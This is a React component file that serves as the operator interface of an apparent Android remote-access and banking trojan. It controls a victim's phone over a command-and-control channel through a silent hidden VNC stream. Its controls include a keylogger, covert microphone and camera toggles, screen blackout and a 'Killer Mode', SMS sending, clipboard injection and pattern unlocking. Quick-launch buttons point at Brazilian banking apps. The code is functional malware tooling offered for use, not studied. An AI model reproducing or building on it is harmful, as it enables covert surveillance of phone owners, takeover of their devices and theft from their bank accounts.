import { useRef, useEffect, useState, useCallback } from 'react';
import { send } from '../lib/socket';
import { api } from '../lib/api';

// ─── Bottom control bar definitions ──────────────────────────────────────────

const NAV = [
  { label: '◀',  title: 'Back',           cmd: 'BACK' },
  { label: '⌂',  title: 'Home',           cmd: 'HOME' },
  { label: '□',  title: 'Recents',        cmd: 'RECENTS' },
  { label: '☰',  title: 'Notifications',  cmd: 'NOTIFICATIONS' },
  { label: '⚙',  title: 'Quick Settings', cmd: 'QUICK_SETTINGS' },
  { label: '⏻',  title: 'Power Menu',     cmd: 'POWER_MENU' },
];

const SCREEN = [
  { label: '⬛ Black ON',  title: 'Black Screen ON',      cmd: 'BLACK_SCREEN_ON' },
  { label: '⬜ Black OFF', title: 'Black Screen OFF',     cmd: 'BLACK_SCREEN_OFF' },
  { label: '🔒 Lock',      title: 'Lock Screen',          cmd: 'LOCK_DEVICE' },
  { label: '📺 Persist',   title: 'Screen Persistence',   cmd: 'SCREEN_PERSISTENCE' },
  { label: '📸 Snap',      title: 'Screenshot (API 11+)', cmd: 'SNAP_SCREEN' },
];

const VOL = [
  { label: '🔊', title: 'Volume Up',   cmd: 'VOLUME_UP' },
  { label: '🔉', title: 'Volume Down', cmd: 'VOLUME_DOWN' },
];

// Toggles — include required 'enabled' boolean
const TOGGLES = [
  { label: '🎙', title: 'Microphone',   cmd: 'TOGGLE_MICROPHONE',    key: 'mic' },
  { label: '📷', title: 'Camera',       cmd: 'TOGGLE_CAMERA',        key: 'cam' },
  { label: '⌨',  title: 'Keylogger',   cmd: 'TOGGLE_KEYLOGGER',     key: 'keylog' },
  { label: '👁',  title: 'Screen Reader',cmd: 'TOGGLE_SCREEN_READER', key: 'reader' },
];

const ADVANCED = [
  { label: '💀 Killer', title: 'Killer Mode (black on unlock)', cmd: 'TOGGLE_KILLER_MODE' },
  { label: '🔄 Reconnect', title: 'Reconnect C2',              cmd: 'RECONNECT_CONNECTION' },
  { label: '🔁 VNC Restart', title: 'Force Restart VNC',       cmd: 'FORCE_RESTART_VNC' },
  { label: '📳 Vibrate',  title: 'Vibrate device',             cmd: 'VIBRATE' },
  { label: '🔧 Config ROM', title: 'Configure ROM autostart',  cmd: 'CONFIGURE_ROM' },
];

// ─── Component ────────────────────────────────────────────────────────────────

export default function HvncView({ device, hvncHandlerRef }) {
  const canvasRef = useRef(null);
  const imgRef    = useRef(null);
  const touchRef  = useRef(null);
  const fpsCount  = useRef({ n: 0, t: Date.now() });
  const urlQueue  = useRef([]);

  const [fps,       setFps]       = useState(0);
  const [streaming, setStreaming] = useState(false);
  const [fullscreen,setFullscreen]= useState(false);
  const [quality,   setQuality]   = useState(80);
  const [toggles,   setToggles]   = useState({ mic: false, cam: false, keylog: false, reader: false });

  // Modals
  const [modal,    setModal]    = useState(null); // 'type'|'inject'|'app'|'sms'|'pattern'
  const [modalVal, setModalVal] = useState({ text: '', phone: '', msg: '', pkg: '', pattern: '' });

  // ── Canvas + image pipeline ──────────────────────────────────────────────

  useEffect(() => {
    const img = new Image();
    imgRef.current = img;

    img.onload = () => {
      const canvas = canvasRef.current;
      if (!canvas) return;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0, canvas.width, canvas.height);

      // FPS counter
      fpsCount.current.n++;
      const now = Date.now();
      if (now - fpsCount.current.t >= 1000) {
        setFps(fpsCount.current.n);
        fpsCount.current = { n: 0, t: now };
      }

      // Revoke oldest URL
      const old = urlQueue.current.shift();
      if (old) URL.revokeObjectURL(old);
      setStreaming(true);
    };

    return () => { img.src = ''; };
  }, []);

  // ── HVNC frame handler (registered with App.jsx) ─────────────────────────

  const onFrame = useCallback((frameType, payload) => {
    // 0x01 = screen, 0x02 = camera (both JPEG)
    if (frameType !== 0x01 && frameType !== 0x02) return;
    const blob = new Blob([payload], { type: 'image/jpeg' });
    const url  = URL.createObjectURL(blob);
    urlQueue.current.push(url);
    if (imgRef.current) imgRef.current.src = url;
  }, []);

  useEffect(() => {
    if (hvncHandlerRef) hvncHandlerRef.current = onFrame;
    return () => { if (hvncHandlerRef) hvncHandlerRef.current = null; };
  }, [onFrame, hvncHandlerRef]);

  // ── Command helpers ───────────────────────────────────────────────────────

  function cmd(action, params = {}) {
    send({ type: 'send_command', deviceId: device.id, action, ...params });
  }

  async function startVnc() {
    // Set quality first, then enable
    cmd('SET_SILENT_VNC_QUALITY', { quality });
    cmd('TOGGLE_SILENT_VNC', { enabled: true, silent_only: true });
    cmd('REQUEST_VNC_FRAME', {});
  }

  function stopVnc() {
    cmd('TOGGLE_SILENT_VNC', { enabled: false });
    setStreaming(false);
    setFps(0);
  }

  function toggle(key, action) {
    const next = !toggles[key];
    setToggles(t => ({ ...t, [key]: next }));
    cmd(action, { enabled: next });
  }

  // ── Normalized coordinate helpers ─────────────────────────────────────────
  // CCS accepts 0.0–1.0 with scale:'vnc_norm' and auto-maps to screen pixels

  function normCoords(clientX, clientY) {
    const canvas = canvasRef.current;
    if (!canvas) return { x: 0, y: 0 };
    const r = canvas.getBoundingClientRect();
    return {
      x: Math.min(1, Math.max(0, (clientX - r.left) / r.width)),
      y: Math.min(1, Math.max(0, (clientY - r.top)  / r.height)),
    };
  }

  // ── Mouse gestures ────────────────────────────────────────────────────────

  function onMouseDown(e) {
    if (e.button !== 0) return;
    touchRef.current = { x: e.clientX, y: e.clientY, t: Date.now() };
  }

  function onMouseUp(e) {
    const s = touchRef.current;
    if (!s) return;
    touchRef.current = null;
    const dt   = Date.now() - s.t;
    const dx   = e.clientX - s.x;
    const dy   = e.clientY - s.y;
    const dist = Math.hypot(dx, dy);

    const { x, y } = normCoords(e.clientX, e.clientY);

    if (dist < 8) {
      cmd(dt > 700 ? 'LONG_PRESS' : 'CLICK', { x, y, scale: 'vnc_norm' });
    } else if (dist > 15 && dt < 700) {
      const s2 = normCoords(s.x, s.y);
      cmd('SWIPE', { x1: s2.x, y1: s2.y, x2: x, y2: y, scale: 'vnc_norm', duration: dt });
    }
  }

  // ── Touch gestures (mobile) ───────────────────────────────────────────────

  function onTouchStart(e) {
    e.preventDefault();
    const t = e.touches[0];
    touchRef.current = { x: t.clientX, y: t.clientY, t: Date.now() };
  }

  function onTouchEnd(e) {
    e.preventDefault();
    const s = touchRef.current;
    if (!s) return;
    touchRef.current = null;
    const t    = e.changedTouches[0];
    const dt   = Date.now() - s.t;
    const dx   = t.clientX - s.x;
    const dy   = t.clientY - s.y;
    const dist = Math.hypot(dx, dy);

    const { x, y } = normCoords(t.clientX, t.clientY);

    if (dist < 12) {
      cmd(dt > 700 ? 'LONG_PRESS' : 'CLICK', { x, y, scale: 'vnc_norm' });
    } else if (dist > 20 && dt < 700) {
      const s2 = normCoords(s.x, s.y);
      cmd('SWIPE', { x1: s2.x, y1: s2.y, x2: x, y2: y, scale: 'vnc_norm', duration: dt });
    }
  }

  // ── Modal submit handlers ─────────────────────────────────────────────────

  function submitModal(e) {
    e.preventDefault();
    const { text, phone, msg, pkg, pattern } = modalVal;
    switch (modal) {
      case 'type':    if (text)    cmd('TYPE',             { text }); break;
      case 'inject':  if (text)    cmd('INJECT_CLIPBOARD', { text }); break;
      case 'app':     if (pkg)     cmd('OPEN_APP',         { package: pkg }); break;
      case 'sms':     if (phone && msg) cmd('SEND_SMS',    { phone, message: msg }); break;
      case 'pattern': if (pattern) cmd('PATTERN_UNLOCK',   { pattern }); break;
    }
    setModal(null);
    setModalVal({ text: '', phone: '', msg: '', pkg: '', pattern: '' });
  }

  // ── Render ────────────────────────────────────────────────────────────────

  function CtrlBtn({ label, title, onClick, on, danger, wide }) {
    return (
      <button title={title} onClick={onClick}
        style={{
          background: on ? '#00d26a18' : danger && on ? '#ff444418' : 'transparent',
          border: `1px solid ${on ? '#00d26a' : danger ? '#ff444488' : '#252535'}`,
          borderRadius: 5, color: on ? '#00d26a' : danger ? '#ff4444' : '#666',
          fontSize: 13, padding: wide ? '5px 12px' : '5px 8px',
          cursor: 'pointer', flexShrink: 0, whiteSpace: 'nowrap',
          transition: 'all .12s', fontFamily: 'inherit',
        }}
        onMouseOver={e => !on && (e.currentTarget.style.borderColor = '#00d26a44')}
        onMouseOut={e => !on && (e.currentTarget.style.borderColor = danger ? '#ff444488' : '#252535')}>
        {label}
      </button>
    );
  }

  const SEP = () => <div style={{ width: 1, height: 20, background: '#252535', flexShrink: 0, margin: '0 2px' }} />;

  function Row({ children }) {
    return (
      <div style={{ display: 'flex', alignItems: 'center', gap: 5, padding: '5px 8px',
        borderBottom: '1px solid #111', overflowX: 'auto', flexWrap: 'wrap',
        scrollbarWidth: 'none' }}>
        {children}
      </div>
    );
  }

  function Modal({ title, children }) {
    return (
      <div style={{ position: 'fixed', inset: 0, background: '#000a', zIndex: 300,
        display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20 }}
        onClick={() => setModal(null)}>
        <form onSubmit={submitModal}
          style={{ background: '#111118', border: '1px solid #252535', borderRadius: 9,
            padding: 24, width: '100%', maxWidth: 380, display: 'flex', flexDirection: 'column', gap: 10 }}
          onClick={e => e.stopPropagation()}>
          <div style={{ fontSize: 14, fontWeight: 600, color: '#ccc', marginBottom: 4 }}>{title}</div>
          {children}
          <div style={{ display: 'flex', gap: 8, justifyContent: 'flex-end', marginTop: 4 }}>
            <button type="button" onClick={() => setModal(null)}
              style={{ padding: '7px 14px', background: 'none', border: '1px solid #252535', borderRadius: 5, color: '#555', cursor: 'pointer', fontFamily: 'inherit' }}>
              Cancel
            </button>
            <button type="submit"
              style={{ padding: '7px 14px', background: '#00613a', border: 'none', borderRadius: 5, color: '#fff', cursor: 'pointer', fontFamily: 'inherit' }}>
              Send
            </button>
          </div>
        </form>
      </div>
    );
  }

  function MInput({ placeholder, value, onChange, type = 'text', mono }) {
    return (
      <input type={type} value={value} onChange={e => onChange(e.target.value)}
        placeholder={placeholder} autoFocus spellCheck={false}
        style={{ width: '100%', padding: '9px 12px', background: '#0a0a0f',
          border: '1px solid #252535', borderRadius: 5, color: '#ddd', fontSize: 13,
          outline: 'none', fontFamily: mono ? 'monospace' : 'inherit' }} />
    );
  }

  const QUICK_PKGS = ['com.whatsapp','com.instagram.android','com.facebook.katana',
    'com.google.android.gm','com.android.chrome','com.nubank.nubank','br.com.itau'];

  return (
    <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', background: '#000',
      ...(fullscreen ? { position: 'fixed', inset: 0, zIndex: 100 } : {}) }}>

      {/* Canvas area */}
      <div style={{ flex: 1, overflow: 'hidden', position: 'relative',
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        background: '#000', cursor: streaming ? 'crosshair' : 'default' }}
        onMouseDown={onMouseDown} onMouseUp={onMouseUp}>

        <canvas ref={canvasRef} width={1080} height={1920}
          style={{ maxWidth: '100%', maxHeight: '100%', display: 'block', touchAction: 'none' }}
          onTouchStart={onTouchStart} onTouchEnd={onTouchEnd} />

        {/* Status badges */}
        <div style={{ position: 'absolute', top: 8, right: 8, display: 'flex', gap: 6, alignItems: 'center' }}>
          {streaming
            ? <><span style={badge('#00d26a')}>● LIVE</span><span style={badge('#888')}>{fps} FPS</span></>
            : <span style={badge('#444')}>● IDLE</span>
          }
          <span style={badge('#555')}>{device.model || device.id.slice(0,8)}</span>
        </div>

        {/* Center call-to-action when idle */}
        {!streaming && (
          <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column',
            alignItems: 'center', justifyContent: 'center', gap: 12, pointerEvents: 'none' }}>
            <div style={{ fontSize: 11, color: '#333', letterSpacing: 3 }}>HVNC READY</div>
            <button onClick={startVnc} style={{ padding: '10px 28px', background: '#00613a',
              border: 'none', borderRadius: 6, color: '#fff', fontSize: 13, cursor: 'pointer',
              letterSpacing: 1, pointerEvents: 'all' }}>▶ Start Stream</button>
          </div>
        )}
      </div>

      {/* ══ CONTROL BAR ══════════════════════════════════════════════════════ */}
      <div style={{ background: '#0c0c12', borderTop: '1px solid #1a1a28', flexShrink: 0 }}>

        {/* Row 1 — Navigation + Screen + Volume + Stream */}
        <Row>
          {NAV.map(b => <CtrlBtn key={b.cmd} label={b.label} title={b.title} onClick={() => cmd(b.cmd)} />)}
          <SEP />
          {SCREEN.map(b => <CtrlBtn key={b.cmd} label={b.label} title={b.title} onClick={() => cmd(b.cmd)} />)}
          <SEP />
          {VOL.map(b => <CtrlBtn key={b.cmd} label={b.label} title={b.title} onClick={() => cmd(b.cmd)} />)}
          <SEP />
          <CtrlBtn label={fullscreen ? '⊡' : '⊞'} title="Toggle fullscreen" onClick={() => setFullscreen(f => !f)} />
          <select value={quality} onChange={e => setQuality(+e.target.value)}
            style={{ padding: '4px 6px', background: '#0a0a0f', border: '1px solid #252535',
              borderRadius: 4, color: '#666', fontSize: 11, cursor: 'pointer' }}>
            {[30,50,70,80,90,100].map(q => <option key={q} value={q}>{q}%</option>)}
          </select>
          {streaming
            ? <CtrlBtn label="⏹ Stop" title="Stop stream" onClick={stopVnc} danger on />
            : <CtrlBtn label="▶ Start" title="Start HVNC" onClick={startVnc} wide />}
        </Row>

        {/* Row 2 — Toggles + Injection + Advanced + Unlock */}
        <Row>
          {/* Module toggles */}
          {TOGGLES.map(b => (
            <CtrlBtn key={b.key} label={`${b.label} ${toggles[b.key] ? 'ON' : 'OFF'}`}
              title={b.title} on={toggles[b.key]}
              onClick={() => toggle(b.key, b.cmd)} />
          ))}
          <SEP />

          {/* Text / injection actions */}
          <CtrlBtn label="⌨ Type"      title="Type text on device"      onClick={() => setModal('type')}    />
          <CtrlBtn label="📋 Inject"   title="Inject clipboard + paste" onClick={() => setModal('inject')}  />
          <CtrlBtn label="📱 App"      title="Launch app by package"    onClick={() => setModal('app')}     />
          <CtrlBtn label="✉ SMS"      title="Send SMS from device"     onClick={() => setModal('sms')}     />
          <CtrlBtn label="🔓 Pattern"  title="Pattern unlock device"    onClick={() => setModal('pattern')} />
          <SEP />

          {/* Advanced */}
          {ADVANCED.map(b => (
            <CtrlBtn key={b.cmd} label={b.label} title={b.title}
              danger={b.cmd === 'TOGGLE_KILLER_MODE'}
              onClick={() => cmd(b.cmd)} />
          ))}
        </Row>
      </div>

      {/* ══ MODALS ════════════════════════════════════════════════════════════ */}

      {modal === 'type' && (
        <Modal title="⌨ Type Text on Device">
          <MInput value={modalVal.text} onChange={v => setModalVal(s => ({...s, text: v}))} placeholder="Text to type..." />
        </Modal>
      )}

      {modal === 'inject' && (
        <Modal title="📋 Inject Clipboard">
          <div style={{ fontSize: 11, color: '#555' }}>Injects into clipboard + auto-pastes into focused field</div>
          <textarea value={modalVal.text} onChange={e => setModalVal(s => ({...s, text: e.target.value}))}
            placeholder="Text to inject..." autoFocus rows={3}
            style={{ width: '100%', padding: '9px 12px', background: '#0a0a0f', border: '1px solid #252535',
              borderRadius: 5, color: '#ddd', fontSize: 13, outline: 'none', resize: 'vertical', fontFamily: 'inherit' }} />
        </Modal>
      )}

      {modal === 'app' && (
        <Modal title="📱 Open App">
          <MInput value={modalVal.pkg} onChange={v => setModalVal(s => ({...s, pkg: v}))} placeholder="com.package.name" mono />
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 5 }}>
            {QUICK_PKGS.map(p => (
              <button key={p} type="button" onClick={() => setModalVal(s => ({...s, pkg: p}))}
                style={{ fontSize: 11, padding: '3px 8px', background: '#1a1a26',
                  border: '1px solid #252535', borderRadius: 4, color: '#777', cursor: 'pointer', fontFamily: 'inherit' }}>
                {p.split('.').pop()}
              </button>
            ))}
          </div>
        </Modal>
      )}

      {modal === 'sms' && (
        <Modal title="✉ Send SMS">
          <MInput value={modalVal.phone} onChange={v => setModalVal(s => ({...s, phone: v}))} placeholder="+1234567890" type="tel" />
          <textarea value={modalVal.msg} onChange={e => setModalVal(s => ({...s, msg: e.target.value}))}
            placeholder="Message..." rows={3}
            style={{ width: '100%', padding: '9px 12px', background: '#0a0a0f', border: '1px solid #252535',
              borderRadius: 5, color: '#ddd', fontSize: 13, outline: 'none', resize: 'vertical', fontFamily: 'inherit' }} />
        </Modal>
      )}

      {modal === 'pattern' && (
        <Modal title="🔓 Pattern Unlock">
          <div style={{ fontSize: 11, color: '#555' }}>Enter pattern as grid positions: 1=top-left, 5=center, 9=bottom-right</div>
          <MInput value={modalVal.pattern} onChange={v => setModalVal(s => ({...s, pattern: v}))} placeholder="e.g. 14789" mono />
        </Modal>
      )}

    </div>
  );
}

function badge(color) {
  return {
    fontSize: 10, color, background: '#0008',
    border: `1px solid ${color}30`, borderRadius: 4,
    padding: '3px 7px', letterSpacing: 1,
  };
}
